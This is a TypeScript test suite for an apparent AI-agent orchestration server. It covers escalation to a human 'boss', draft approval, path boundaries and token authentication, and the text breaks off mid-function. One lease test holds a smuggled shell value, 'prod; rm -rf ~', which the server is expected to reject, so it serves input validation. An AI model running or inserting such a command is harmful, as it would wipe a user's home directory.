import { expect, test } from "bun:test";
import { renderSaid } from "../../src/platform/text/lang.ts";
import { said } from "../support/said.ts";
import { mkdirSync, symlinkSync, writeFileSync } from "node:fs";
import { dirname, join } from "node:path";
import { and, asc, desc, eq, gt, isNull, ne, sql } from "drizzle-orm";
import { openMemory, type DB } from "../../src/platform/persistence/database.ts";
import { AgentTurnPayloadSchema, Scheduler, type Job } from "../../src/platform/scheduling/scheduler.ts";
import { makeApp } from "../../src/composition/api.ts";
import { askKind, brief } from "../../src/api/orch/escalation.ts";
import { landGroup } from "../../src/api/panel/group.ts";
import { cacheProjectSkills, listSkills, projectSkills } from "../../src/mech/skills.ts";
import { landed } from "../../src/mech/flow/mergequeue.ts";
import { getGithubLogin } from "../../src/api/panel/authflow.ts";
import { makeGithub } from "../../src/mech/git/github.ts";
import { saveAuth } from "../../src/mech/sandbox/auth.ts";
import { testContext } from "../support/test-context.ts";

/** A JSON response, for the GitHub stubs below. */
const json = (body: unknown): Response =>
  new Response(JSON.stringify(body), { status: 200, headers: { "content-type": "application/json" } });
import { sweepApproved } from "../../src/mech/flow/start.ts";
import { escalationKey } from "../../src/mech/flow/escalate.ts";
import * as fx from "../support/factories.ts";
import { fakeSandbox } from "../support/fake-sandbox.ts";
import { routeCalls } from "../support/route-source.ts";
import { seedAuth } from "../support/seed-auth.ts";
import {
  agent,
  channel,
  escalation,
  event,
  grp,
  job,
  lease,
  note,
  project,
  slice,
  task,
} from "../../src/platform/persistence/schema.ts";
import { SnapshotSchema } from "../../src/contracts/panel.ts";
import { NotesResponseSchema } from "../../src/contracts/notes.ts";
import { z } from "zod";
import { JsonValue, type Json } from "../../src/contracts/json.ts";
import { ErrorResponseSchema } from "../../src/contracts/protocol.ts";
import type { Github } from "../../src/mech/git/github.ts";
import { tempDir } from "../support/temp.ts";

const BoundaryPayload = z.object({ boundary: z.array(z.object({ id: z.number() })) });
const BoundaryIdeasPayload = z.object({ boundary: z.array(z.object({ id: z.number(), idea: z.string() })) });
const GroupIdResponse = z.object({ grp_id: z.number() });
const IdeaResponse = GroupIdResponse.extend({ boundaryNeeded: z.boolean() });
const MessageResponse = z.object({ message: z.string() });
const PullRequestResponse = z.object({ number: z.number() });
const StartedResponse = z.object({ started: z.array(z.number()) });
const DirsResponse = z.object({
  dirs: z.array(z.object({ name: z.string(), repo: z.boolean(), taken: z.boolean() })),
  parent: z.string(),
});
const PauseResponse = z.object({ status: z.enum(["PAUSING", "PAUSED"]), waiting: z.number() });

async function harness(handle?: (cmd: string, cwd: string) => { code?: number; out?: string; err?: string }) {
  const ran: Job[] = [];
  const sandbox = fakeSandbox(handle);
  const db = await openMemory();
  const ctx = await testContext({ db, sandbox, sched: new Scheduler(db, async (j) => void ran.push(j)) });
  await seedAuth(db);
  const app = makeApp(ctx);

  const f = fx.on(db);
  const p = await f.project.create({ name: "p", remote: "https://github.com/o/p.git" });
  const g = await f.runningGrp.create({ project_id: p.id, name: "g1" });
  // Identity is the token, never a body field: the server listens on localhost
  // TCP, so anything else on 127.0.0.1 could otherwise claim to be any agent.
  await f.agent.create({ project_id: p.id, grp_id: g.id, model: "sonnet", token: "tok-eng" });
  await f.agent.create({ project_id: p.id, grp_id: g.id, role: "qa", model: "sonnet", token: "tok-qa" });
  return { db, bus: ctx.bus, sched: ctx.sched, ctx, app, ran, sandbox, engineer: "tok-eng", qa: "tok-qa", f };
}

/** The reads this file does over and over. */
const first = async <T>(rows: Promise<T[]>): Promise<T | undefined> => (await rows)[0];
const grpStatus = async (db: DB, id = 1) =>
  (await first(db.select({ s: grp.status }).from(grp).where(eq(grp.id, id))))?.s;
/** The Architect's queued turn for a group, found by the role in its payload. */
const architectTurn = (db: DB, grpId: number, newest = false) =>
  first(
    db
      .select({ payload_json: job.payload_json })
      .from(job)
      .where(and(eq(job.grp_id, grpId), sql`${job.payload_json}->>'role' = 'architect'`))
      .orderBy(newest ? desc(job.id) : asc(job.id)),
  );

const agentTurns = (db: DB) =>
  db
    .select({ agent_id: job.agent_id, payload_json: job.payload_json })
    .from(job)
    .where(eq(job.kind, "agent_turn"))
    .orderBy(asc(job.id));

const post = (app: (r: Request) => Promise<Response>, path: string, body?: Json, token?: string) =>
  app(
    new Request(`http://x${path}`, {
      method: "POST",
      body: JSON.stringify(body ?? {}),
      // Both real callers set it — `orch` at cli.ts and the mailbox replay — and
      // the server now refuses an unlabelled body outright rather than silently
      // treating it as no body at all.
      headers: {
        "content-type": "application/json",
        "idempotency-key": crypto.randomUUID(),
        ...(token ? { "x-orch-token": token } : {}),
      },
    }),
  );
const get = (app: (r: Request) => Promise<Response>, path: string) => app(new Request(`http://x${path}`));
const state = async (app: (r: Request) => Promise<Response>) =>
  SnapshotSchema.parse(await (await get(app, "/api/v1/state")).json());
const withToken = (app: (r: Request) => Promise<Response>, path: string, token: string) =>
  app(new Request(`http://x${path}`, { headers: { "x-orch-token": token } }));
const githubAnswer = (data: Json): Github => ({
  remaining: () => null,
  request: async (_method, _path, schema) => ({ ok: true, status: 200, data: schema.parse(data) }),
});

/**
 * Wait for something the handler under test does on its own.
 *
 * `Bun.sleep(5)` was long enough while the database was in this process. Every
 * step of a handler is a round trip now, so a fixed wait is a bet on the day's
 * scheduling — and the failure it produces reads as a wrong status rather than
 * as a race. Under the 5s test timeout, not equal to it: at 5s the runner kills
 * the test first and the only thing reported is "timed out", never the row that
 * was actually read.
 */
async function until<T>(read: () => Promise<T>, is: (value: T) => boolean, within = 4_000): Promise<T> {
  const deadline = Date.now() + within;
  for (;;) {
    const seen = await read();
    if (is(seen) || Date.now() > deadline) return seen;
    await Bun.sleep(1);
  }
}

test("the versioned protocol has no legacy route aliases", async () => {
  const { app } = await harness();
  expect((await get(app, "/api/v1/state")).status).toBe(200);
  expect((await get(app, "/api/state")).status).toBe(404);
  expect((await post(app, "/orch/status", { text: "legacy" }, "tok-eng")).status).toBe(404);
});

test("mutating routes replay one result and reject key reuse with another payload", async () => {
  const { app, db } = await harness();
  const send = (text: string) =>
    app(
      new Request("http://x/api/v1/ideas", {
        method: "POST",
        headers: { "content-type": "application/json", "idempotency-key": "idea-once" },
        body: JSON.stringify({ project_id: 1, text }),
      }),
    );

  const first = await send("add one durable feature");
  const firstBody = JsonValue.parse(await first.json());
  const replay = await send("add one durable feature");
  expect(JsonValue.parse(await replay.json())).toEqual(firstBody);
  expect(replay.headers.get("idempotency-replayed")).toBe("true");
  expect(await db.select({ id: grp.id }).from(grp)).toHaveLength(2);

  const conflict = await send("a different feature");
  expect(conflict.status).toBe(409);
  expect(await conflict.json()).toMatchObject({ code: "idempotency_conflict" });
});

test("an over-long journal is rejected with a reason the agent can act on", async () => {
  const { app } = await harness();
  const r = await post(app, "/orch/v1/journal", { kind: "journal", body: "a\nb\nc\nd\ne\nf\ng" }, "tok-eng");
  expect(r.status).toBe(422);
  expect(await r.text()).toContain("max 6");
});

test("journal writes a note and exports journal/retro into the checkout", async () => {
  const _wt = tempDir("orch-wt-");
  const { app, db, sandbox } = await harness();

  const r = await post(
    app,
    "/orch/v1/journal",
    { kind: "journal", body: "Moved token check into middleware.", files: ["auth/mw.ts"] },
    "tok-eng",
  );
  expect(r.status).toBe(200);
  const out = await r.text();
  expect(out).toContain("docs/journal/g1/001-journal.md");

  // Into the group's own checkout, which is inside its sandbox — so it merges
  // with the PR like any other file the group wrote.
  const written = sandbox.files.get("/work/docs/journal/g1/001-journal.md")!;
  // The frontmatter is asserted by parsing it, not by matching its text: it is
  // serialised by `Bun.YAML.stringify` now, because concatenation had no escaping
  // and a file name with a comma in it silently became two entries.
  expect(Bun.YAML.parse(written.split("---")[1]!)).toMatchObject({ kind: "journal", files: ["auth/mw.ts"] });
  expect(written).toContain("Moved token check into middleware.");

  const filed = await first(db.select({ kind: note.kind, export_path: note.export_path }).from(note));
  expect(filed?.kind).toBe("journal");
  expect(filed?.export_path).toBe("docs/journal/g1/001-journal.md");
});

test("a fact never gets exported to git — only journal/retro/decision do", async () => {
  const _wt = tempDir("orch-wt-");
  const { app, db } = await harness();
  await post(app, "/orch/v1/journal", { kind: "fact", body: "boss prefers iteration" }, "tok-eng");
  const filed = await first(db.select({ export_path: note.export_path }).from(note));
  expect(filed?.export_path).toBeNull();
});

test("mail rejects intents outside the five", async () => {
  const { app } = await harness();
  const r = await post(app, "/orch/v1/mail", { target: "qa", intent: "handoff", body: "x" }, "tok-eng");
  expect(r.status).toBe(400);
  expect(await r.text()).toContain("ask, request, inform, note, decision");
});

test("a waking intent enqueues a turn for the named target; note does not", async () => {
  const { app, db } = await harness();
  await post(app, "/orch/v1/mail", { target: "qa", intent: "request", body: "please verify" }, "tok-eng");
  let jobs = await agentTurns(db);
  expect(jobs.map((j) => j.agent_id)).toEqual([2]);

  await post(app, "/orch/v1/mail", { target: "qa", intent: "note", body: "fyi" }, "tok-eng");
  jobs = await agentTurns(db);
  expect(jobs.length).toBe(1);
});

test("ask-boss blocks the caller and a blocker pauses the whole group", async () => {
  const { app, db, ctx } = await harness((_cmd) => ({ code: 0, out: "deadbeef\n" }));
  const pending = post(
    app,
    "/orch/v1/ask-boss",
    {
      severity: "blocker",
      question: "which validation library?",
      brief: "validation library",
      kind: "design",
    },
    "tok-eng",
  );

  // Waited for, not slept on: the handler files the question, reads HEAD, blocks
  // the agent and then pauses the group, and each of those is a round trip.
  expect(
    await until(
      () => grpStatus(db),
      (s) => s === "PAUSING",
    ),
  ).toBe("PAUSING");
  expect((await first(db.select({ s: agent.state }).from(agent).where(eq(agent.id, 1))))?.s).toBe("blocked");
  // Registered before anything can answer, so by the time the group is pausing it
  // is already there — waiting on it says nothing about the routing below.
  expect(ctx.waiters.size).toBe(1);
  // The route still owns its fields and rollback checkpoint; `raise` only owns how
  // the row is filed, so moving the INSERT cannot silently drop either contract.
  // `chain_state` is what the wait hangs on, because routing is the last thing the
  // handler does before it blocks.
  await until(
    async () => (await first(db.select({ s: escalation.chain_state }).from(escalation)))?.s,
    (s) => s === "boss",
  );
  expect(
    await first(
      db
        .select({
          grp_id: escalation.grp_id,
          agent_id: escalation.agent_id,
          severity: escalation.severity,
          brief: escalation.brief,
          kind: escalation.kind,
          chain_state: escalation.chain_state,
          checkpoint_sha: escalation.checkpoint_sha,
        })
        .from(escalation),
    ),
  ).toEqual({
    grp_id: 1,
    agent_id: 1,
    severity: "blocker",
    brief: "validation library",
    kind: "design",
    // No PM/Architect/CoS exists in this fixture, so route immediately skips the
    // ordinary PM entry point and leaves the question on the boss.
    chain_state: "boss",
    checkpoint_sha: "deadbeef",
  });

  const ans = await post(app, "/api/v1/escalations/1/answer", { answer: "use zod" });
  expect(ans.status).toBe(200);

  const r = await pending;
  expect(await r.json()).toEqual({ message: "use zod" });
  expect(await grpStatus(db)).toBe("RUNNING");
  expect((await first(db.select({ s: agent.state }).from(agent).where(eq(agent.id, 1))))?.s).toBe("idle");
});

test("reserved ask-boss questions start at the boss after filing", async () => {
  const { app, db } = await harness();
  const pending = post(app, "/orch/v1/ask-boss", { question: "what is the API token?" }, "tok-eng");
  const filed = await until(
    () => first(db.select({ severity: escalation.severity, chain_state: escalation.chain_state }).from(escalation)),
    (row) => row !== undefined,
  );
  // A typo or omission is advisory at this API boundary, but credentials must still
  // skip every stand-in. Both policies used to be a second UPDATE after the INSERT.
  expect(filed).toEqual({ severity: "advisory", chain_state: "boss" });

  await post(app, "/api/v1/escalations/1/answer", { answer: "do not disclose it" });
  expect(await (await pending).json()).toEqual({ message: "do not disclose it" });
});

test("an unknown lease resource says how to get one added", async () => {
  const { app } = await harness();
  const r = await post(app, "/orch/v1/lease", { resource: "unity", args: {} }, "tok-eng");
  expect(r.status).toBe(422);
  expect(await r.text()).toContain("Ask the boss");
});

test("a lease with bad args never reaches the queue", async () => {
  const { app, db, f } = await harness();
  await f.resource.create({
    name: "build",
    template: "make {target}",
    arg_schema_json: { target: { type: "enum", values: ["debug", "release"] } },
  });
  const r = await post(app, "/orch/v1/lease", { resource: "build", args: { target: "prod; rm -rf ~" } }, "tok-eng");
  expect(r.status).toBe(422);
  expect(await db.select({ id: lease.id }).from(lease)).toHaveLength(0);
});

test("dropping an idea creates a PLANNING group, a channel, and a dispatcher turn", async () => {
  const { app, db } = await harness();
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "add rate limiting to the API" });
  const { grp_id } = GroupIdResponse.parse(await r.json());

  // PLANNING, not DRAFT: the Dispatcher has to run before there is anything to
  // approve, so "planning" and "waiting for the boss" cannot be one state.
  expect(await grpStatus(db, grp_id)).toBe("PLANNING");
  // channel.grp_id is the only link; grp deliberately has no reverse pointer.
  const ch = await first(db.select({ id: channel.id }).from(channel).where(eq(channel.grp_id, grp_id)));
  expect(ch?.id).toBeGreaterThan(0);

  // The idea is on the blackboard verbatim, so a respec can point back at it.
  const filed = await first(db.select({ body: note.body }).from(note).where(eq(note.grp_id, grp_id)));
  expect(filed?.body).toBe("add rate limiting to the API");

  // Another group in this project already holds paths, so the Architect is asked
  // for the boundary FIRST — planning work against paths you may not own is how
  // the plan gets written twice.
  const roles = (
    await db
      .select({ payload_json: job.payload_json })
      .from(job)
      .where(eq(job.grp_id, grp_id))
      .orderBy(desc(job.priority))
  ).map((j) => AgentTurnPayloadSchema.parse(j.payload_json).role);
  expect(roles).toEqual(["architect", "dispatcher"]);
});

test("the only group in a project skips the boundary step", async () => {
  const { app, db } = await harness();
  await db.update(grp).set({ status: "DISSOLVED" }).where(eq(grp.id, 1));
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "idea" });
  const { grp_id, boundaryNeeded } = IdeaResponse.parse(await r.json());
  expect(boundaryNeeded).toBe(false);
  const roles = (await db.select({ payload_json: job.payload_json }).from(job).where(eq(job.grp_id, grp_id))).map(
    (j) => AgentTurnPayloadSchema.parse(j.payload_json).role,
  );
  expect(roles).toEqual(["dispatcher"]);
});

test("the Dispatcher runs while PLANNING; a filed DRAFT then blocks until approval", async () => {
  const { app, db, sched, ran, f } = await harness();
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "idea" });
  const { grp_id } = GroupIdResponse.parse(await r.json());
  await sched.drain();
  // Both planning turns DO run: without them the boss has nothing to approve.
  expect(ran.map((j) => AgentTurnPayloadSchema.parse(j.payload_json).role)).toEqual(["architect", "dispatcher"]);

  const card = `目标 : x
不做 : y
验收 : bun test 绿
验收 : 无回归
切片 : a [normal] — a.test.ts 绿
切片 : b [trivial] — b 的回归用例绿
切片 : c [hard] — 端到端场景通过
风险 : none
反对 : 无
名字 : group-approval-planning`;
  // Filing the card is what moves the group to DRAFT, and DRAFT blocks.
  await f.agent.create({ project_id: 1, grp_id, role: "dispatcher", token: "tok-disp" });
  const filed = await post(app, "/orch/v1/draft", { group_id: grp_id, card }, "tok-disp");
  expect(filed.status).toBe(200);
  expect(await grpStatus(db, grp_id)).toBe("DRAFT");
  const before = ran.length;
  await sched.drain();
  expect(ran.length).toBe(before);

  // Approval with no card in the body uses the one that was filed.
  // Sampled before the call: tick() invokes the executor synchronously, so the
  // turn is already counted by the time the response comes back.
  const planningTurns = ran.length;
  const ok = await post(app, `/api/v1/draft/${grp_id}/approve`);
  expect(ok.status).toBe(200);
  expect(await grpStatus(db, grp_id)).toBe("RUNNING");

  const slices = await db
    .select({ title: slice.title, difficulty: slice.difficulty })
    .from(slice)
    .where(eq(slice.grp_id, grp_id))
    .orderBy(asc(slice.seq));
  expect(slices.map((s) => s.difficulty)).toEqual(["normal", "trivial", "hard"]);
  // Approval also creates one task per slice, or the writer has nothing to claim
  // and the whole review pipeline never fires.
  expect(await db.select({ id: task.id }).from(task).where(eq(task.grp_id, grp_id))).toHaveLength(3);

  await sched.drain();
  // Approval also starts the first slice: a plan that is approved and then sits
  // still is the most confusing failure there is.
  expect(ran.length).toBeGreaterThan(planningTurns);
  expect(ran.at(-1)!.slice_id).toBe(
    (await first(db.select({ id: slice.id }).from(slice).where(eq(slice.grp_id, grp_id)).orderBy(asc(slice.seq))))!.id,
  );
});

test("a malformed card is refused both when filed and when approved", async () => {
  const { app, db, f } = await harness();
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "idea" });
  const { grp_id } = GroupIdResponse.parse(await r.json());
  await f.agent.create({ project_id: 1, grp_id, role: "dispatcher", token: "tok-disp" });

  // Validated where it is filed, so the boss is never shown a broken card.
  const filed = await post(app, "/orch/v1/draft", { group_id: grp_id, card: "目标 : only this" }, "tok-disp");
  expect(filed.status).toBe(422);
  expect(await grpStatus(db, grp_id)).toBe("PLANNING");

  const approved = await post(app, `/api/v1/draft/${grp_id}/approve`, { card: "目标 : still broken" });
  expect(approved.status).toBe(422);
});

test("sending a DRAFT back records the reason and re-runs the dispatcher", async () => {
  const { app, db } = await harness();
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "idea" });
  const { grp_id } = GroupIdResponse.parse(await r.json());
  await post(app, `/api/v1/draft/${grp_id}/reject`, { reason: "wrong layer" });

  const notes = await db.select({ body: note.body }).from(note).where(eq(note.grp_id, grp_id)).orderBy(asc(note.id));
  expect(notes.at(-1)!.body).toContain("wrong layer");
  const jobs = await db.select({ payload_json: job.payload_json }).from(job).where(eq(job.grp_id, grp_id));
  expect(AgentTurnPayloadSchema.parse(jobs.at(-1)!.payload_json).respec).toBe("wrong layer");
});

test("pause is PAUSING only while something is in flight, PAUSED once idle", async () => {
  const { app, db, f } = await harness();
  await f.job.create({ grp_id: 1, state: "running" });
  const r = PauseResponse.parse(await (await post(app, "/api/v1/groups/1/pause")).json());
  // An in-flight turn cannot be steered, so claiming PAUSED would be a lie —
  // and the reply says how many turns it is waiting on.
  expect(r).toEqual({ status: "PAUSING", waiting: 1 });
  expect(await grpStatus(db)).toBe("PAUSING");

  await db.update(job).set({ state: "done" });
  await db.update(grp).set({ status: "RUNNING" }).where(eq(grp.id, 1));
  const idle = PauseResponse.parse(await (await post(app, "/api/v1/groups/1/pause")).json());
  expect(idle).toEqual({ status: "PAUSED", waiting: 0 });
});

test("park cancels queued work and leaves the worktree alone", async () => {
  const { app, db, sched } = await harness();
  await sched.enqueue("agent_turn", { grp_id: 1 });
  await sched.enqueue("agent_turn", { grp_id: 1 });
  await post(app, "/api/v1/groups/1/park");
  const states = (await db.select({ state: job.state }).from(job)).map((r) => r.state);
  expect(states).toEqual(["cancelled", "cancelled"]);
  expect(await grpStatus(db)).toBe("PARKED");
});

test("rejecting a slice records the feedback as a fact and re-runs the group", async () => {
  const { app, db, f } = await harness();
  await f.slice.create({ grp_id: 1, seq: 1, title: "S1", accept_spec: "tests" });
  await post(app, "/api/v1/slices/1/reject", { feedback: "tests are too shallow" });

  expect((await first(db.select({ s: slice.status }).from(slice).where(eq(slice.id, 1))))?.s).toBe("rejected");
  expect((await first(db.select({ b: note.body }).from(note).where(eq(note.kind, "fact"))))?.b).toContain(
    "too shallow",
  );
  expect(await agentTurns(db)).toHaveLength(1);
});

test("ctx query is capped so it never costs more than the file it replaces", async () => {
  const { app, f } = await harness();
  for (let i = 0; i < 200; i++) {
    await f.note.create({ grp_id: 1, body: `middleware note ${i} ` + "x".repeat(400) });
  }

  const r = await post(app, "/orch/v1/ctx/query", { question: "middleware token check" }, "tok-eng");
  const { message: out } = MessageResponse.parse(await r.json());
  expect(out.length).toBeLessThanOrEqual(16_000);
  expect(out).toContain("middleware");
});

test("ctx query with no hits tells the agent what to do instead of returning junk", async () => {
  const { app, db } = await harness();
  // No slices either, or the group's acceptance criteria would legitimately come
  // back as the frame for any question.
  await db.delete(slice);
  const r = await post(app, "/orch/v1/ctx/query", { question: "quantum tunnelling" }, "tok-eng");
  const out = await r.text();
  expect(out).toContain("nothing on the blackboard matches");
  expect(out).toContain("orch mail pm");
});

test("state snapshot carries everything the three views need", async () => {
  const { app } = await harness();
  const s = await state(app);
  for (const k of ["projects", "groups", "slices", "agents", "tasks", "escalations"] as const) {
    expect(Array.isArray(s[k])).toBe(true);
  }
  expect(s.agents.length).toBe(2);
});

test("a missing or bogus token is refused everywhere", async () => {
  const { app } = await harness();
  // Every verb, not a sample of five. The check lives on the mount now, so this
  // is what says a new route cannot be added under `/orch/v1` without it.
  const paths = [
    "/orch/v1/status",
    "/orch/v1/journal",
    "/orch/v1/mail",
    "/orch/v1/ask-boss",
    "/orch/v1/setup",
    "/orch/v1/lease",
    "/orch/v1/ctx/query",
    "/orch/v1/task/claim",
    "/orch/v1/task/done",
    "/orch/v1/review",
    "/orch/v1/audit",
    "/orch/v1/pr",
    "/orch/v1/answer",
    "/orch/v1/triage",
    "/orch/v1/draft",
    "/orch/v1/owns",
    "/orch/v1/drop",
    "/orch/v1/blocked",
    "/orch/v1/split",
  ];
  for (const p of paths) {
    const payload = { kind: "journal", body: "x", intent: "note", target: "qa" };
    // No token at all. 401, not the 422 these used to answer: the check moved
    // off the top of each handler and onto the `/orch/v1` mount, and a single
    // gate may as well use the status code that means what happened.
    expect((await post(app, p, payload)).status).toBe(401);
    // A token that belongs to nobody. An agent cannot promote itself by
    // sending someone else's id, because the id is never in the body.
    expect((await post(app, p, payload, "not-a-real-token")).status).toBe(401);
  }
});

test("the token decides which agent acted, not anything in the body", async () => {
  const { app, db } = await harness();
  await post(app, "/orch/v1/status", { text: "verifying S1" }, "tok-qa");
  const rows = await db.select({ role: agent.role, activity: agent.activity }).from(agent).orderBy(asc(agent.id));
  expect(rows[0]!.activity).toBeNull();
  expect(rows[1]!.activity).toBe("verifying S1");
});

test("filing the card drops the group's other queued planning turns", async () => {
  const { app, db, sched, f } = await harness();
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "idea" });
  const { grp_id } = GroupIdResponse.parse(await r.json());
  await f.agent.create({ project_id: 1, grp_id, role: "dispatcher", token: "tok-disp" });
  await sched.enqueue("agent_turn", { grp_id, payload: { role: "architect" } });

  const card = `目标 : x
不做 : y
验收 : a
验收 : b
切片 : a [normal] — a.test.ts 绿
切片 : b [trivial] — b 的回归用例绿
切片 : c [hard] — 端到端场景通过
风险 : none
反对 : 无
名字 : draft-cancels-queue`;
  await post(app, "/orch/v1/draft", { group_id: grp_id, card }, "tok-disp");

  // DRAFT is not dispatchable, so a leftover planning turn would sit pending
  // forever and then fire after approval against a plan it never saw.
  const pending = await db
    .select({ id: job.id })
    .from(job)
    .where(and(eq(job.grp_id, grp_id), eq(job.state, "pending")));
  expect(pending).toHaveLength(0);
});

test("a group name is short and branch-shaped, whatever the idea looked like", async () => {
  const { app, db } = await harness();
  await post(app, "/api/v1/ideas", {
    project_id: 1,
    text: "greet 现在只支持英文，加一个可选的语言参数，中文时返回「你好 X」",
  });
  const name = (await first(db.select({ n: grp.name }).from(grp).orderBy(desc(grp.id))))!.n;
  // It becomes orch/<name>, a worktree path and every log line, so a slugified
  // 40-character sentence is a nuisance forever.
  expect(name.length).toBeLessThanOrEqual(28);
  expect(name).toContain("greet");
});

test("a group can be named instead of numbered, everywhere it is referenced", async () => {
  const { app, db, f } = await harness();
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "greet lang parameter" });
  const { grp_id } = GroupIdResponse.parse(await r.json());
  const name = (await first(db.select({ n: grp.name }).from(grp).where(eq(grp.id, grp_id))))!.n;
  await f.agent.create({ project_id: 1, grp_id, role: "dispatcher", token: "tok-disp" });

  const card = `目标 : x
不做 : y
验收 : a
验收 : b
切片 : a [normal] — a.test.ts 绿
切片 : b [trivial] — b 的回归用例绿
切片 : c [hard] — 端到端场景通过
风险 : none
反对 : 无
名字 : group-by-name`;
  // An agent reaches for the name it can see — one was observed running
  // `orch draft greet -` — and refusing that teaches it nothing.
  const filed = await post(app, "/orch/v1/draft", { group_id: name, card }, "tok-disp");
  expect(filed.status).toBe(200);
  expect(await grpStatus(db, grp_id)).toBe("DRAFT");
});

test("the state snapshot carries the filed card so the boss can see what they approve", async () => {
  const { app, db, f } = await harness();
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "greet lang" });
  const { grp_id } = GroupIdResponse.parse(await r.json());
  await f.agent.create({ project_id: 1, grp_id, role: "dispatcher", token: "tok-disp" });
  const card = `目标 : 支持 zh
不做 : 不引依赖
验收 : bun test 全绿
验收 : greet("x","zh") 返回「你好 x」
切片 : lang 参数 [trivial] — 默认行为不变
切片 : zh 词条 [trivial] — 断言通过
切片 : 类型导出 [normal] — 类型检查过
风险 : 无
反对 : 无
名字 : state-carries-card`;
  await post(app, "/orch/v1/draft", { group_id: grp_id, card }, "tok-disp");

  const s = await state(app);
  const filed = s.draftCards.find((card) => card.grpId === grp_id);
  // Showing an empty box and asking for approval is asking the boss to approve
  // something they cannot see.
  expect(filed?.body).toContain("支持 zh");

  // An objection that lands after the card must reach the boss too: the card
  // says `Objection: none` because the Dispatcher does not wait for the Architect.
  await f.agent.create({ project_id: 1, role: "architect", token: "tok-arch" });
  await post(
    app,
    "/orch/v1/mail",
    { target: "dispatcher", intent: "inform", body: "反对：第三片与验收冲突" },
    "tok-arch",
  );
  const s2 = await state(app);
  const late = s2.lateObjections.find((objection) => objection.grpId === grp_id);
  expect(late?.body).toContain("与验收冲突");
  expect(late?.author).toBe("architect");

  // The same objection, filed in the same millisecond as the card — which the
  // two writes above really do hit on a fast machine. Under a strict `>` the
  // objection was dropped, and dropping it is what this feature exists to
  // prevent, so the intermittent failure was the defect rather than noise.
  const cardAt = await first(
    db
      .select({ at: note.at })
      .from(note)
      .where(and(eq(note.grp_id, grp_id), sql`${note.frontmatter_json} @> '{"draft_card": true}'::jsonb`))
      .orderBy(desc(note.at)),
  );
  await db
    .update(event)
    .set({ at: cardAt!.at })
    .where(and(eq(event.grp_id, grp_id), eq(event.kind, "say"), eq(event.author, "architect")));
  const s3 = await state(app);
  expect(s3.lateObjections.filter((objection) => objection.grpId === grp_id)).toHaveLength(1);
});

test("a second group triggers boundaries for every undeclared group, not just the new one", async () => {
  const { app, db } = await harness();
  // The pre-existing group has no owns: it was the only group when it started.
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "second idea" });
  const { grp_id } = GroupIdResponse.parse(await r.json());

  const boundary = (await architectTurn(db, grp_id))!;
  const groups = BoundaryPayload.parse(boundary.payload_json).boundary;
  // An undeclared group beside a declared one is the same risk the rule exists to
  // prevent, just reached from the other direction.
  expect(groups.map((g) => g.id).sort((a, b) => a - b)).toEqual([1, grp_id].sort((a, b) => a - b));
});

test("a group that already declared its paths is not asked again", async () => {
  const { app, db } = await harness();
  await db
    .update(grp)
    .set({ owns_json: ["src/auth/**"] })
    .where(eq(grp.id, 1));
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "second idea" });
  const { grp_id } = GroupIdResponse.parse(await r.json());
  const boundary = (await architectTurn(db, grp_id))!;
  expect(BoundaryPayload.parse(boundary.payload_json).boundary.map((group) => group.id)).toEqual([grp_id]);
});

test("the snapshot carries the boss's original words alongside the card", async () => {
  const { app, f } = await harness();
  const idea = "greet 现在只支持英文，加一个可选的语言参数";
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: idea });
  const { grp_id } = GroupIdResponse.parse(await r.json());

  const s = await state(app);
  // The 20 seconds on the card are the only guard against a well-formed plan
  // aimed at the wrong thing, and that comparison needs the original next to it.
  expect(s.ideas.find((item) => item.grpId === grp_id)?.body).toBe(idea);

  // The first thing the boss said, not the latest — later messages are feedback.
  await f.event.create({ grp_id, author: "boss", kind: "boss_say", body: "and also make it fast", at: 999 });
  const s2 = await state(app);
  expect(s2.ideas.find((item) => item.grpId === grp_id)?.body).toBe(idea);
});

test("an approval a boundary blocks is recorded, not thrown away", async () => {
  const { app, db, f } = await harness();
  await db
    .update(grp)
    .set({ owns_json: ["src/**"] })
    .where(eq(grp.id, 1));
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "second idea" });
  const { grp_id } = GroupIdResponse.parse(await r.json());
  await f.agent.create({ project_id: 1, grp_id, role: "dispatcher", token: "tok-d" });
  const card = `目标 : x
不做 : y
验收 : a.test.ts 绿
验收 : 无回归
切片 : a [normal] — a.test.ts 绿
切片 : b [trivial] — b 的回归用例绿
切片 : c [hard] — 端到端场景通过`;
  await db.update(grp).set({ status: "DRAFT" }).where(eq(grp.id, grp_id));
  await f.note.create({
    project_id: 1,
    grp_id,
    body: card + "\n风险 : 无\n反对 : 无\n名字 : boundary-block-approval",
    frontmatter_json: { draft_card: true },
  });

  const held = await post(app, `/api/v1/draft/${grp_id}/approve`);
  // 200: the boss did decide. A 422 shows a red error and asks for the same click
  // again — and the click it asked for used to be a 500 (see the next test).
  expect(held.status).toBe(200);
  // The framing sentence, not a word out of one translation of it: the toast has
  // to say the click landed, or a 200 reads like the 422 it deliberately is not.
  expect(await held.text()).toContain(
    renderSaid("zh", said("Approval recorded — it starts by itself once the boundary clears.")),
  );

  const g = (await first(
    db.select({ status: grp.status, approved_at: grp.approved_at }).from(grp).where(eq(grp.id, grp_id)),
  ))!;
  expect(g.status).toBe("DRAFT");
  expect(g.approved_at).toBeGreaterThan(0);

  const queued = (await architectTurn(db, grp_id, true))!;
  const boundary = AgentTurnPayloadSchema.parse(queued.payload_json).boundary;
  expect(Array.isArray(boundary) ? boundary.length : 0).toBeGreaterThan(0);
});

/** A blocked group B beside a running group A that holds every path. */
async function blocked(h: Awaited<ReturnType<typeof harness>>) {
  const { app, db, f } = h;
  await db
    .update(grp)
    .set({ owns_json: ["src/a/**"] })
    .where(eq(grp.id, 1));
  const r = await post(app, "/api/v1/ideas", { project_id: 1, text: "second idea" });
  const { grp_id } = GroupIdResponse.parse(await r.json());
  await db
    .update(grp)
    .set({ status: "DRAFT", owns_json: ["src/a/mw.ts"] })
    .where(eq(grp.id, grp_id));
  await f.note.create({
    project_id: 1,
    grp_id,
    body: `目标 : x
不做 : y
验收 : a.test.ts 绿
验收 : 无回归
